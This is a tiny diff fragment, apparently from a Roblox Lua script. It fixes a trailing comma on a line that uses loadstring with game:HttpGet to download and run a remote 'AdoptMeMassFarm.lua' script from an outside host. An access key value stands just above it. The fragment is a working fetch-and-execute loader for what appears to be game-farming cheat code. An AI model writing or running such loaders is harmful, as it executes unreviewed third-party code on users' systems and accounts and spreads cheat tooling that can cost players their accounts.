@@ -79,4 +79,4 @@
         },
      }
 script_key="QacuMoFTcTTEIpdycAvMlFWHPRBYnoDH"
-loadstring(game:HttpGet("https://zekehub.com/scripts/AdoptMeMassFarm.lua"))(),
+loadstring(game:HttpGet("https://zekehub.com/scripts/AdoptMeMassFarm.lua"))()
